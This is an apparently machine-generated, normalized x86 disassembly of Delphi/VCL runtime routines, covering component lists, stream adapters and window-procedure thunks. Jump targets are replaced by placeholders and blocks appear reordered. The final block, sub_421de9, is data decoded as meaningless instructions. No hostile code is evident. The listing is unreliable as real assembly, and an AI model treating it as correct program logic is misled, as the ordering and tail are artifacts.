mov eax ebx
call sub_4210a0
mov edx ebx
mov eax esi
call sub_420b58
pop edi
pop esi
pop ebx
retn
sub_420c10
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_418390
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_420bd8
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_420b58
sub_420c68
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_4182a8
call sub_420c68
inc edi
dec esi
jne r-xdata
sub_420ca4
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_418444
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_403174
xor eax eax
mov [ ebx + 0x14 ] eax
sub_420cc8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_420ca4
mov edx ebx
mov eax esi
call sub_420ca4
pop esi
pop ebx
retn
sub_420ce4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_420cc8
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4182a8
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_420d40
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_420aec
push ebx
push sub_420b14
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_420b00
push ebx
push sub_420b20
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_420e38
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_407db4
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_420ed0
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b804
call sub_403928
sub_420ed0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_4182a8
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_407db4
test al al
jne r-xdata
sub_420f20
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_4042f8
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_407ed0
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b804
call sub_403928
xor edx edx
mov eax ebx
call sub_4210a0
mov edx esi
mov eax ebx
call sub_420fac
mov dl 0x1
mov eax ebx
call sub_4210a0
sub_420fc0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_4182a8
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_418234
sub_420ffc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_418304
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_418198
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_418324
sub_421050
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_420fec
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_420fc0
mov cl 0x1
mov edx ebx
call sub_421050
inc edi
dec ebp
jne r-xdata
sub_4210a0
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_404188
mov edx esp
mov eax esi
call sub_403470
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_4210e8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_421110
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_421158
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_403228
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_4211b8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_4211dc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403144
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_421224
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403164
test bl bl
jle r-xdata
mov edx esi
call sub_421454
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_42128c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_421454
mov edx ebx
mov eax esi
call sub_421448
sub_4212d0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4209c8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_421314
push ebx
push esi
push edi
call sub_403528
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420a14
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_420cc8
jmp r-xdata
mov eax esi
call sub_418390
mov edx eax
mov eax edi
call sub_421454
lea eax [ edi + 0x50 ]
call sub_40cfec
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403510
sub_421374
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_420ce4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_4213a0
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_4213bc
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_4213d8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_4182a8
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_421454
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_418198
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_4182a8
cmp ebp eax
jne r-xdata
sub_421494
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_420cc8
mov edx ebx
call sub_420a98
sub_4214c0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403144
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_421508
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403164
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_403174
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_421540
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_42158f
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_4215a8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_4215f7
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421610
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_42167a
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_421694
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4216dd
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_41ab48
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4216f8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_4057cc
xor eax eax
push ebp
push sub_4218e5
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_4218be
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4026f4
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_4218ad
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_402714
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_4039d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4218ec
lea eax [ ebp + 0xc ]
call sub_405758
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_4039d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_421928
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_42198b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_4219bc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_418938
mov edi eax
xor eax eax
push ebp
push sub_421a11
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421a18
mov eax [ rw-data ]
call sub_41899c
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4182a8
call sub_403174
inc esi
dec ebx
jne r-xdata
sub_421a30
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_421a58
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4028f0
mov edx sub_421a30
lea eax [ esi + 0x5 ]
call sub_421a50
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_421a50
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_421b14
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406ae0
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_421a58
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_421bc8
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_421af0
sub_421bf0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_421c94
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421c9b
retn
mov eax [ rw-data ]
call sub_417890
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_4219bc
xor edx edx
xor eax eax
call sub_41ba98
mov eax rw-data
call sub_40cfec
call sub_405e88
lea eax [ eax + 0xc ]
call sub_40cfec
mov eax rw-data
call sub_40cfec
mov eax rw-data
call sub_405758
mov eax sub_421a28
call sub_4055f4
mov eax rw-data
call sub_40cfec
call sub_4207e8
mov eax rw-data
call sub_40cfec
mov eax rw-data
call sub_405758
sub_421ca0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_421d29
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421d30
retn
call sub_4207b4
mov eax sub_421a28
call sub_4055ec
mov dl 0x1
mov eax [ r-xdata ]
call sub_40cd2c
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_405770
mov dl 0x1
mov eax [ r-xdata ]
call sub_41718c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4187e0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4187e0
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_421de9
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ ebx - 0x1 ] ah
add [ eax ] al
xchg [ fs : edi ] al
inc [ fs : eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ ebp - 0x1 ] ah
add [ eax ] al
xchg [ fs : edi ] al
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ edi - 0x1 ] ah
add [ eax ] al
xchg [ fs : edi ] al
push 0x640000ff
xchg [ edi ] al
imul edi edi 0x86640000
inc edi
add [ edx - 0x1 ] ch
add [ eax ] al
xchg [ fs : edi ] al
imul edi edi 0x0
add [ esi + eax * 4 + 0x47 ] ah
add [ edi + edi * 8 ] ch
add [ esi + eax * 4 + 0x47 ] ah
add [ ebp - 0x1 ] ch
add [ eax ] al
xchg [ fs : edi ] al
outsb
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ edi - 0x1 ] ch
add [ eax ] al
xchg [ fs : edi ] al
push eax
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ ecx - 0x1 ] dl
add [ eax ] al
xchg [ fs : edi ] al
push edx
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ ebx - 0x1 ] dl
add [ eax ] al
xchg [ fs : edi ] al
push esp
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ ebp - 0x1 ] dl
add [ eax ] al
xchg [ fs : edi ] al
push esi
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ edi - 0x1 ] dl
add [ eax ] al
xchg [ fs : edi ] al
pop eax
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ ecx - 0x1 ] bl
add [ eax ] al
xchg [ fs : edi ] al
pop edx
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ ebx - 0x1 ] bl
add [ eax ] al
xchg [ fs : edi ] al
pop esp
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ ebp - 0x1 ] bl
add [ eax ] al
xchg [ fs : edi ] al
pop esi
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ edi - 0x1 ] bl
add [ eax ] al
xchg [ fs : edi ] al
inc eax
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ ecx - 0x1 ] al
add [ eax ] al
xchg [ fs : edi ] al
inc edx
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ ebx - 0x1 ] al
